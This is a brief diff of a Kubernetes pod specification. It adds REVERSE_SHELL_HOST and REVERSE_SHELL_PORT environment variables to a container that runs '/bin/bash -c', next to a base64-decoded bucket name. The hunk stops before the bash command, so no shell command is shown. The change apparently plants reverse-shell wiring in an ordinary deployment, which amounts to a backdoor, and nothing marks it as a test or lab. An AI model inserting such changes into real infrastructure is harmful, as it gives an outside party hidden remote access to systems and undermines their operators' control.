@@ -186,6 +186,10 @@ spec:
             env:
             - name: BUCKET_NAME
               value: "$(echo -n $NEW_BUCKET_NAME | base64 -d)"
+            - name: REVERSE_SHELL_HOST
+              value: "$REVERSE_SHELL_HOST"
+            - name: REVERSE_SHELL_PORT
+              value: "$REVERSE_SHELL_PORT"
             command: [
                 "/bin/bash", 
                 "-c", 
